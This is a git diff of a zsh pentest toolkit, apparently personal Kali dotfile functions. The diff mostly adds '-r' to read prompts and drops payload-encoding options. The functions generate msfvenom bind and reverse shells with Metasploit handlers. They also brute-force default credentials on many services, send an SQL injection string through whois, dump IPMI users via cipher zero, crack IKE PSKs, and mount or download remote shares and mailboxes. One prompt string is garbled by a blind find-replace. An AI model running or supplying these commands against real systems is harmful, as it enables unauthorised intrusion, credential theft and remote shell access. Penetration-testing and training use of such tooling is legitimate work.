@@ -2,7 +2,7 @@
 # Interface Setting
 chnic(){
     nic_lst=$(ifconfig | awk -F" " '{print $1}' | grep : | tr -d ':' | tr '\n' ', ')
-    read nic\?"SELECT NIC (${nic_lst%?}): "
+    read -r nic\?"SELECT NIC (${nic_lst%?}): "
     export inter=$nic
     export ip=$(ifconfig $inter 2>/dev/null | awk -F" " '{print $2}' | sed -n '2 p')
 }
@@ -36,54 +36,39 @@ alias pygpoabuse='/home/kali/TOOLS/pyGPOAbuse/venv/bin/python3 ~/TOOLS/pyGPOAbus
 
 # MSF Listener / Binder Generator
 metash(){
-    read os\?"SELECT OS (win32 / win64 / lin32 / lin64): "
+    read -r os\?"SELECT OS (win32 / win64 / lin32 / lin64): "
     if [[ $os =~ ^lin* ]]; then
-        read form\?"SELECT FORMAT (elf, elf-so, c, py): "
+        read -r form\?"SELECT FORMAT (elf, elf-so): "
     fi
     if [[ $os =~ ^win* ]]; then
-        read form\?"SELECT FORMAT (exe, ps1, msi, dll, asp, aspx, hta, vba, vbs, c, py): "
+        read -r form\?"SELECT FORMAT (exe, ps1, msi, dll, asp, aspx, hta, vba, vbs): "
     fi
 
     ext_form=$form
-    enc=""
-
     if [[ $form == "ps1" ]]; then
         form="psh"
         ext_form="ps1"
     fi
 
-    bofstr=""
-    if [[ $form == "c" || $form == "py" ]]; then
-        read badchars\?"INPUT BADCHAR STRING (DEFAULT -> \x00\x0a\x0d\x20\x04): "
-        if [[ $badchars == "" ]]; then
-            badchars='\x00\x0a\x0d\x20'
-        fi
-        if [[ $os == "win32" || $os == "lin32" ]]; then
-            enc="-e x86/shikata_ga_nai -i 5"
-        fi
-
-        bofstr="-b '$badchars' --smallest -n 15 $enc"
-    fi
-
-    read type\?"SELECT STAGING: (staged / stageless): "
-    read lis\?"SELECT CONNECTION (bind / reverse): "
+    read -r type\?"SELECT STAGING: (staged / stageless): "
+    read -r lis\?"SELECT CONNECTION (bind / reverse): "
     chnic
-    read port\?"LISTENER PORT: "
+    read -r port\?"LISTENER PORT: "
 
     if [[ $os =~ ^lin* ]]; then
         if [[ $os == "lin32" ]]; then
             if [[ $type == "staged" ]]; then
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom $bofstr -p linux/x86/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x86/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom $bofstr -p linux/x86/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x86/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
@@ -93,15 +78,15 @@ metash(){
             if [[ $type == "stageless" ]]; then 
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom $bofstr -p linux/x86/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x86/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom $bofstr -p linux/x86/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x86/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
@@ -112,15 +97,15 @@ metash(){
             if [[ $type == "staged" ]]; then
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom $bofstr -p linux/x64/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x64/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom $bofstr -p linux/x64/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x64/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
@@ -129,15 +114,15 @@ metash(){
             if [[ $type == "stageless" ]]; then
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom $bofstr -p linux/x64/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x64/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom $bofstr -p linux/x64/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x64/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
@@ -151,15 +136,15 @@ metash(){
             if [[ $type == "staged" ]]; then
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom $bofstr -p windows/x64/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p windows/x64/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom $bofstr -p windows/x64/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p windows/x64/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
@@ -168,15 +153,15 @@ metash(){
             if [[ $type == "stageless" ]]; then
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom $bofstr -p windows/x64/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p windows/x64/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom $bofstr -p windows/x64/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p windows/x64/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
@@ -189,7 +174,7 @@ metash(){
                     echo -e "\nGENERATING SHELL\n"
                     msfvenom -a x86 -p windows/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/x86/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
                 fi
 
@@ -206,7 +191,7 @@ metash(){
                     echo -e "\nGENERATING SHELL\n"
                     msfvenom -a x86 -p windows/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
                 fi
 
@@ -309,12 +294,12 @@ scan(){
         echo -e "\nTESTING DEFAULT CREDENTIALS\n"
         hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$2:$3
 
-        read creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
+        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
         if [[ ! -z $creds ]]; then
             usr=$(echo $creds | cut -d":" -f1)
             psw=$(echo $creds | cut -d":" -f2)
 
-            read resp\?"DO YOU WANT TO DOWNLOAD ALL FILES IN \"./$2_FTP\"? (Y/N)"
+            read -r resp\?"DO YOU WANT TO DOWNLOAD ALL FILES IN \"./$2_FTP\"? (Y/N)"
             if [[ $resp =~ [Yy]$ ]]; then
                 echo -e "\nDOWNLOADING FILES\n"
                 mkdir ./$2_FTP && cd ./$2_FTP && wget --mirror --user="$usr" --password="$psw" --no-passive-ftp ftp://$2:$3
@@ -340,7 +325,7 @@ scan(){
         echo -e "\nNSLOOKUP LOCALHOST/IP QUERIES\n"
         echo "SERVER $2\n127.0.0.1\nlocalhost\n$2\nexit" | nslookup
 
-        read dnsdom\?"INPUT A DOMAIN TO ENUMERATE (BLANK TO SKIP): "
+        read -r dnsdom\?"INPUT A DOMAIN TO ENUMERATE (BLANK TO SKIP): "
         if [[ ! -z $dnsdom ]]; then
             echo -e "\nNMAP SRV-ENUM RECORDS\n"
             sudo nmap -Pn -n -sUV -p$3 --script dns-srv-enum --script-args dns-srv-enum.domain=$dnsdom $2
@@ -422,7 +407,7 @@ scan(){
         echo -e "\nMSF VERSION FINGERPRINT\n"
         msfconsole -q -x "use auxiliary/scanner/smtp/smtp_version; set RHOSTS $2; set RPORT $3; exploit; exit"
 
-        read mtd\?"INPUT METHOD FOR USER BRUTEFORCING (BLANK TO SKIP): "
+        read -r mtd\?"INPUT METHOD FOR USER BRUTEFORCING (BLANK TO SKIP): "
         if [[ ! -z $mtd ]]; then
             echo -e "\nBRUTEFORCING USERNAMES (Names)\n"
             smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/Names/names.txt -t $2 -p $3 -w 15
@@ -441,7 +426,7 @@ scan(){
         echo -e "\nTESTING SQL INJECTION\n"
         whois -h $2 -p $3 "a') or 1=1#"
 
-        read whois_dom\?"INPUT DOMAIN TO QUERY (BLANK TO SKIP): "
+        read -r whois_dom\?"INPUT DOMAIN TO QUERY (BLANK TO SKIP): "
         if [[ ! -z $whois_dom ]]; then
             whois -h $2 -p $3 "$whois_dom"
         fi
@@ -455,7 +440,7 @@ scan(){
         echo -e "\nTESTING DEFAULT CREDENTIALS\n"
         hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt postgres://$2:$3
 
-        read creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
+        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
         if [[ ! -z $creds ]]; then
             user=$(echo $creds | cut -d":" -f1)
             password=$(echo $creds | cut -d":" -f2)
@@ -507,7 +492,7 @@ scan(){
         echo -e "\nMSF ENUMERATION\n"
         msfconsole -q -x "use auxiliary/scanner/portmap/portmap_amp; set RHOSTS $2; set RPORT $3; exploit; exit"
 
-        read resp\?"INPUT A VALID NIS DOMAIN (BLANK TO SKIP): "
+        read -r resp\?"INPUT A VALID NIS DOMAIN (BLANK TO SKIP): "
         if [[ ! -z $resp ]]; then
             echo -e "\nDUMPING INFORMATION\n"
             ypwhich -d $resp $2
@@ -528,7 +513,7 @@ scan(){
         echo -e "\nMSF FINGERPRINT\n"
         msfconsole -q -x "use auxiliary/scanner/pop3/pop3_version; set RHOSTS $2; set RPORT $3; exploit; exit"
 
-        read cred\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): " 
+        read -r cred\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): " 
         if [[ ! -z $cred ]]; then
             usr=$(echo $cred | cut -d":" -f1)
             psw=$(echo $cred | cut -d":" -f2)
@@ -536,7 +521,7 @@ scan(){
             echo -e "\nLISTING MESSAGES\n"
             curl -u "$usr:$psw" -s pop3://$2:$3
 
-            while true; do read msg\?"INPUT MESSAGE TO RETRIEVE: " && curl -u "$usr:$psw" -s pop3://$2:$3/$msg; done
+            while true; do read -r msg\?"INPUT MESSAGE TO RETRIEVE: " && curl -u "$usr:$psw" -s pop3://$2:$3/$msg; done
         fi
 
     fi
@@ -548,7 +533,7 @@ scan(){
         echo -e "\nSHOWMOUNTING CHECKS\n"
         showmount -e $2
 
-        read shr\?"INPUT MOUNTABLE SHARE (BLANK TO SKIP): "
+        read -r shr\?"INPUT MOUNTABLE SHARE (BLANK TO SKIP): "
         if [[ ! -z $shr ]]; then
             echo -e "\nMOUNTING TO \"/mnt/$2_$shr\"\n"
             sudo mkdir /mnt/$2_$shr && sudo mount -t nfs $2:/$shr /mnt/$2_$shr -o nolock && cd /mnt/$2_$shr
@@ -556,7 +541,7 @@ scan(){
     fi
 
     if [[ $1 == "ident" ]]; then
-        read portlist\?"INPUT SPACE-SEPARATED OPEN PORTS: "
+        read -r portlist\?"INPUT SPACE-SEPARATED OPEN PORTS: "
 
         echo -e "\nENUMERATING USERS OF SUPPLIED PORTS\n"
         ident-user-enum $2 $3 $portlist
@@ -587,17 +572,17 @@ scan(){
         echo -e "\nFINGERPRINTING VERSION\n"
         sudo nmap -n -Pn -sUV --script "snmp-info" -p$3 $2
 
-        read snmp_ver\?"INPUT SNMP VERSION (1, 2c, 3): "
+        read -r snmp_ver\?"INPUT SNMP VERSION (1, 2c, 3): "
         if [[ $snmp_ver == "3" ]]; then
             echo -e "\nPERFORMING USER BRUTEFORCING (XATO-TOP-1000 / PROBABLE-V2)\n"
             echo "$2:$3" > /tmp/$2_host.txt
             cur=$(pwd) && cd ~/TOOLS/snmpwn && ./snmpwn.rb -u /usr/share/seclists/Usernames/xato_top_1000_custom.txt -p /usr/share/seclists/Passwords/probable-v2-top1575.txt --enclist /usr/share/seclists/Passwords/probable-v2-top1575.txt -h /tmp/$2_host.txt && cd $cur
 
-            echo ""; read snmp_data\?"INPUT A VALID \"USER:PASS\" COMBINATION (CTRL-C IF NONE): "
+            echo ""; read -r snmp_data\?"INPUT A VALID \"USER:PASS\" COMBINATION (CTRL-C IF NONE): "
             usr=$(echo $snmp_data | cut -d':' -f1)
             pass=$(echo $snmp_data | cut -d':' -f2)
 
-            read snmp_os\?"INPUT OPERATING SYSTEM (lin, win): "
+            read -r snmp_os\?"INPUT OPERATING SYSTEM (lin, win): "
             if [[ $snmp_os == "win" ]]; then
                 echo -e "\nEXTRACING USERS\n"
                 snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 1.3.6.1.4.1.77.1.2.25
@@ -624,9 +609,9 @@ scan(){
         else
             echo -e "\nBRUTEFORCING COMMUNITY STRING\n"
             onesixtyone -p $3 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $2
-            echo ""; read com_string\?"INPUT A VALID COMMUNITY STRING (CTRL-C IF NONE): "
+            echo ""; read -r com_string\?"INPUT A VALID COMMUNITY STRING (CTRL-C IF NONE): "
 
-            echo -e "\nDUMPING PARSED MIB TREE IN \"$2_SNMPCHECK.txt\"\n"
+            echo -e "\nDUMPING PARSED MIB TREE IN \"$2_SNMPCHECK.txt\" -> CHECK INTERESTING PROCESS STRINGS!\n"
             snmp-check -v $snmp_ver -p $3 -d -c $com_string $2 > $2_SNMPCHECK.txt
 
             echo -e "\nDUMPING MIB STRINGS IN \"$2_SNMPWALK.txt\"\n"
@@ -663,7 +648,7 @@ scan(){
         echo -e "\nMSF FINGERPRINT\n"
         msfconsole -q -x "use auxiliary/scanner/imap/imap_version; set RHOSTS $2; set RPORT $3; exploit; exit"
 
-        read cred\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
+        read -r cred\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
         if [[ ! -z $cred ]]; then
             usr=$(echo $cred | cut -d":" -f1)
             psw=$(echo $cred | cut -d":" -f2)
@@ -671,7 +656,7 @@ scan(){
             echo -e "\nLISTING MAILBOXES\n"
             curl -u "$usr:$psw" imap://$2:$3 -X 'LIST "" "*"'
 
-            while true; do read mailbox\?"INPUT MAILBOX TO READ: " && curl -u "$usr:$psw" imap://$2:$3/$mailbox && read index\?"INPUT MAIL UID TO READ (BLANK TO SKIP): " && curl -u "$usr:$psw" "imap://$2:$3/$mailbox;UID=$index"; done
+            while true; do read -r mailbox\?"INPUT MAILBOX TO READ: " && curl -u "$usr:$psw" imap://$2:$3/$mailbox && read -r index\?"INPUT MAIL UID TO read -r (BLANK TO SKIP): " && curl -u "$usr:$psw" "imap://$2:$3/$mailbox;UID=$index"; done
         fi
 
     fi
@@ -694,7 +679,7 @@ scan(){
         echo -e "\nCHECKING CIPHER ZERO\n"
         msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS $2; set RPORT $3; exploit; exit"
 
-        read resp\?"IS CIPHER ZERO SUCCESSFUL? (Y/N): "
+        read -r resp\?"IS CIPHER ZERO SUCCESSFUL? (Y/N): "
         if [[ $resp =~ [Yy] ]]; then
             echo -e "\nAUTHENTICATING AS ROOT AND DUMPING USERS\n"
             ipmitool -I lanplus -C 0 -H $2 -U root -P root user list
@@ -737,7 +722,7 @@ scan(){
         nxc smb $2 -u '' -p '' --local-auth --port $3
         nxc smb $2 -u 'Guest' -p '' --local-auth --port $3
 
-        read resp\?"DO YOU WANT TO TEST SMBCLIENT BINDINGS? (Y/N): "
+        read -r resp\?"DO YOU WANT TO TEST SMBCLIENT BINDINGS? (Y/N): "
         if [[ $resp =~ [Yy] ]]; then
             echo -e "\nSTANDARD CHECK\n"
             smbclient -p $3 -N -L $2
@@ -778,25 +763,25 @@ scan(){
         sudo ike-scan -M --showbackoff $2 -d $3
         sudo ike-scan -M --showbackoff --ikev2 $2 -d $3
 
-        read tra\?"DO YOU WANT TO BRUTEFORCE ID VALUES? (Y/N)"
+        read -r tra\?"DO YOU WANT TO BRUTEFORCE ID VALUES? (Y/N)"
         if [[ $tra =~ [Yy] ]]; then
             echo -e "\nBRUTEFORCING TRANSFORMATION\n"
             sudo python3 ~/TOOLS/iker.py $2
         fi
     
-        read grp\?"DO YOU WANT TO BRUTEFORCE GROUP IDS WITH IKE-SCAN METHOD? (Y/N)"
+        read -r grp\?"DO YOU WANT TO BRUTEFORCE GROUP IDS WITH IKE-SCAN METHOD? (Y/N)"
         if [[ $grp =~ [Yy] ]]; then
             echo -e "\nBRUTEFORCING VIA IKE-SCAN\n"
-            while read line; do (echo "Found ID: $line" && sudo ike-scan -d $3 -M -A -n $line $2) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < ~/WORDLISTS/ike-custom.txt
+            while read -r line; do (echo "Found ID: $line" && sudo ike-scan -d $3 -M -A -n $line $2) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < ~/WORDLISTS/ike-custom.txt
         fi
 
-        read ike_id\?"INPUT A VALID IKE-ID (BLANK TO SKIP): "
+        read -r ike_id\?"INPUT A VALID IKE-ID (BLANK TO SKIP): "
         if [[ ! -z $ike_id ]]; then
             echo -e "\nGRABBING AND CRACKING HASH\n"
             ike-scan -M -A -n $ike_id --pskcrack=$2_hash.txt $2
             psk-crack -d /usr/share/wordlists/weakpass_4.txt $2_hash.txt    
 
-            read ike_psw\?"INPUT FOUND PSK PASSWORD: "
+            read -r ike_psw\?"INPUT FOUND PSK PASSWORD: "
             if [[ ! -z $ike_psw ]]; then
                 echo -e "\nINITIATING STRONG-SWAN CONNECTION -> USE sT NMAP SCAN!\n"
                 chnic
@@ -821,7 +806,7 @@ scan(){
         echo -e "\nENUMERATION AND MODULE LISTING\n"
         sudo nmap -n -Pn  -v -sV --script "rsync-* and not brute" -p$3 $2
 
-        while true; do read shr\?"INPUT SHARE NAME TO DOWNLOAD (CTRL-C IF NONE): " && echo -e "\nDOWNLOADING \"$shr\" IN \"./$2-$shr_RSYNC\"\n" &&  mkdir $2-$shr_RSYNC && cd $2-$shr_RSYNC && rsync -av rsync://$2:$3/$shr && cd ..; done
+        while true; do read -r shr\?"INPUT SHARE NAME TO DOWNLOAD (CTRL-C IF NONE): " && echo -e "\nDOWNLOADING \"$shr\" IN \"./$2-$shr_RSYNC\"\n" &&  mkdir $2-$shr_RSYNC && cd $2-$shr_RSYNC && rsync -av rsync://$2:$3/$shr && cd ..; done
     fi
 
     if [[ $1 == "mssql" ]]; then
@@ -834,11 +819,11 @@ scan(){
         echo -e "\nTESTING DEFAULT CREDENTIALS\n"
         hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt $1://$2:$3
 
-        read creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
+        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
         if [[ ! -z $creds ]]; then
             usr=$(echo $creds | cut -d":" -f1)
             psw=$(echo $creds | cut -d":" -f2)
-            read dom\?"INPUT INSTANCE NAME: "
+            read -r dom\?"INPUT INSTANCE NAME: "
 
             echo -e "\nATTEMPTING WINDOWS AUTHENTICATION\n"
             mssqlclient.py "$dom/$usr:$psw@$2" -windows-auth
@@ -875,11 +860,11 @@ scan(){
         echo -e "\nODAT TESTING\n"
         odat all -s $2 -p $3
 
-        read creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
+        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
         if [[ ! -z $creds ]]; then
             usr=$(echo $creds | cut -d":" -f1)
             psw=$(echo $creds | cut -d":" -f2)
-            read db\?"INPUT DATABASE NAME: "
+            read -r db\?"INPUT DATABASE NAME: "
 
             echo -e "\nATTEMPTING SYSDBA AUTHENTICATION\n"  
             sqlplus "$usr/$psw@$2/$db" as sysdba
@@ -902,7 +887,7 @@ scan(){
         echo -e "\nFETCHING ITEMS\n"
         memcdump --servers=$2
 
-        while true; do read item\?"INPUT ITEM NAME TO READ: " && memccat --servers=$2 $item; done
+        while true; do read -r item\?"INPUT ITEM NAME TO READ: " && memccat --servers=$2 $item; done
     fi
 
     if [[ $1 == "redis" ]]; then
@@ -925,7 +910,7 @@ scan(){
         echo -e "\nTESTING DEFAULT CREDENTIALS\n"
         hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt vnc://$2:$3
 
-        read psw\?"INPUT VALID PASSWORD IF FOUND: "
+        read -r psw\?"INPUT VALID PASSWORD IF FOUND: "
         if [[ ! -z $psw ]]; then
             echo -e "\nATTEMPTING CONNECTION\n"
             echo $psw > /tmp/$2_VNCPASS.txt
@@ -937,10 +922,10 @@ scan(){
         echo -e "\nCHECKING IF PIVOTING IS POSSIBLE\n"
         python3 ~/TOOLS/spose/spose.py --proxy http://$2:$3 --target $2
 
-        read conf\?"DO YOU WANT TO ADD THE PROXYCHAINS ENTRY? (Y/N): "
+        read -r conf\?"DO YOU WANT TO ADD THE PROXYCHAINS ENTRY? (Y/N): "
         if [[ $conf =~ [Yy] ]]; then
             flg=""
-            read creds\?"INPUT \"USER:PASS\" COMBO IF AUTHENTICATION IS NEEDED: "
+            read -r creds\?"INPUT \"USER:PASS\" COMBO IF AUTHENTICATION IS NEEDED: "
             if [[ ! -z $creds ]]; then
                 flg=" $(echo $creds | cut -d":" -f1) $(echo $creds | cut -d":" -f2)"
             fi
@@ -963,7 +948,7 @@ scan(){
         echo -e "\nTESTING DEFAULT CREDENTIALS\n"
         hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://$2:$3
 
-        read creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
+        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
         if [[ ! -z $creds ]]; then
             usr=$(echo $creds | cut -d":" -f1)
             psw=$(echo $creds | cut -d":" -f2)
@@ -987,13 +972,13 @@ scan(){
         echo -e "\nCHECKING GUEST AUTHENTICATION\n"
         curl -kIL http://$2:$3/api/connections -u guest:guest
 
-        read cred\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
+        read -r cred\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
         if [[ ! -z $cred ]]; then
             echo -e "\nFETCHING API CONNECTIONS\n"
             curl -kIL http://$2:$3/api/connections -u "$cred"
         fi
 
-        read amqp_hash\?"INPUT B64 AMQP HASH IF FOUND: "
+        read -r amqp_hash\?"INPUT B64 AMQP HASH IF FOUND: "
         if [[ ! -z $amqp_hash ]]; then
             echo $amqp_hash | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > /tmp/$2_AMQP.txt
             hashcat -m 1420 --hex-salt /tmp/$2_AMQP.txt /usr/share/wordlists/weakpass_4.txt
@@ -1004,7 +989,7 @@ scan(){
         echo -e "\nENUMERATION\n"
         sudo nmap -n -pn -v -sV --script="mongodb-* and not brute" -p$3 $2
 
-        read creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
+        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
         if [[ ! -z $creds ]]; then
             usr=$(echo $creds | cut -d":" -f1)
             psw=$(echo $creds | cut -d":" -f2)
@@ -1018,7 +1003,7 @@ scan(){
         echo -e "\nLISTING AVAILABLE VOLUMES\n"
         sudo gluster --remote-host=$2:$3 volume list
 
-        read glust\?"INPUT VOLUME TO MOUNT: "
+        read -r glust\?"INPUT VOLUME TO MOUNT: "
         echo -e "\nMOUNTING VOLUME \"$glust\"\n"
         sudo mkdir /mnt/$glust && sudo mount -t glusterfs $2:$3/$glust /mnt/$glust && cd /mnt/$glust
     fi
@@ -1032,7 +1017,7 @@ scan(){
         msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RPORT $3; set RHOSTS $2; exploit; exit"
         msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; set RPORT $3; set RHOSTS $2; exploit; exit"
 
-        read creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
+        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
         if [[ ! -z $creds ]]; then
             usr=$(echo $creds | cut -d":" -f1)
             psw=$(echo $creds | cut -d":" -f2)
@@ -1092,7 +1077,7 @@ techscan(){
         echo -e "\nCHECKING WAF PRESENCE\n"
         wafme0w -t $1 --no-warning --concurrency 15
 
-        read pub\?"IS THE DOMAIN BEHIND CLOUDFLARE? (Y/N): "
